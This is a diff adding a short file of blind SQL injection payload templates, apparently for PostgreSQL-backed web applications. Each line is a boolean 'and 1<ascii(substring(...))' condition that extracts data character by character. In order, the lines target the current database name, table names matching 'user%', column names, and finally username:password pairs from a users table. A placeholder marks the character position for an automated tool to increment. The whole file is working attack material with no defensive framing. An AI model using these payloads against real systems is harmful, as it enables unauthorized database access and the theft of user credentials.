@@ -1,0 +1,7 @@
+database: and 1<ascii(substring((select current_database()),1,1))
+tables like user length: and 1=length((select table_name from information_schema.tables where table_name like 'user%' limit 1 offset 0))
+tables like user: and 1<ascii(substring((select table_name from information_schema.tables where table_name like 'user%' limit 1 offset 0),1,1))
+
+column like user: and 1<ascii(substring((select column_name from information_schema.columns where table_name='users' and column_name like 'user%' limit 1 offset 0),1,1))
+
+content: and 1<ascii(substring((select username||':'||password from users limit 1 offset 0),{INC_1},1))
